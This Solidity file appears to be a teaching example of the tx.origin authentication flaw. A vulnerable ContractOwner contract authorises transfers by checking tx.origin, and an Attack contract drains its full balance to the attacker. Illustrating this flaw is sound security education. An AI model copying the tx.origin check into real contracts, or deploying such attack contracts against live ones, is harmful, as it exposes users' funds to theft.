// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;


contract ContractOwner {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function deposit() external payable {
    }

    // A -> ContractOwner.transfer() (tx.origin = A)
    // A -> Attack -> ContractOwner.transfer() (tx.origin = A)

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}

contract Attack {
    address payable public owner;
    ContractOwner contractOwner;

    constructor(ContractOwner _contractOwner) {
        contractOwner = ContractOwner(_contractOwner);
        owner = payable(msg.sender);
    }

    function attack() public {
        contractOwner.transfer(owner, address(contractOwner).balance);
    }
}
